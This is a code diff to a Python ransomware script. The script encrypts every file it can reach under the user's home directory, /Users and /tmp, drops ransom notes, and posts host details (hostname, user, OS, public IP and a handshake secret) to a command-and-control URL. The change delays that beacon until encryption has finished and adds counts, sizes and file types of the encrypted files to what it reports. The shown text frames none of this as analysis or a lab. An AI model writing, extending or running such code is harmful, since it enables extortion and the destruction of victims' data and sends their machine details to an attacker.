@@ -116,7 +116,7 @@ def drop_notes(dirs,sid):
                 try:open(os.path.join(dp,NOTE_NAME),'w').write(txt)
                 except:pass
 
-def beacon(sid):
+def beacon(sid,stats=None):
     try:
         d={'handshake':SECRET,'machine_name':socket.gethostname(),'computer_user':os.getenv('USER','?'),
            'os':f'{platform.system()} {platform.release()}','date':datetime.datetime.now().strftime('%d/%m/%Y, %A'),
@@ -124,6 +124,10 @@ def beacon(sid):
            'systemid':sid,'password':'RSA_PROTECTED'}
         try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode()
         except:pass
+        if stats:
+            d['encrypted_count']=str(stats['count'])
+            d['encrypted_size']=str(stats['size'])
+            d['encrypted_types']=','.join(sorted(stats['types']))
         req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
         urllib.request.urlopen(req,timeout=10)
     except:pass
@@ -135,13 +139,21 @@ def main():
     else:
         td=_tf.mkdtemp();pub_pem_path=os.path.join(td,'pub.pem')
         open(pub_pem_path,'wb').write(RSA_PUB)
-    sid=get_sid();beacon(sid);n=0
+    sid=get_sid()
+    stats={'count':0,'size':0,'types':set()}
     roots=[os.path.expanduser('~'),'/Users','/tmp']
     for r in roots:
         if not os.path.isdir(r):continue
         for dp,_,fs in os.walk(r):
             for f in fs:
-                if encrypt(os.path.join(dp,f),pub_obj,pub_pem_path):n+=1
+                fp=os.path.join(dp,f)
+                try:sz=os.path.getsize(fp)
+                except:sz=0
+                if encrypt(fp,pub_obj,pub_pem_path):
+                    stats['count']+=1;stats['size']+=sz
+                    _,e=os.path.splitext(f)
+                    if e:stats['types'].add(e.lower())
     drop_notes(roots,sid)
+    beacon(sid,stats)
 
 if __name__=='__main__':main()
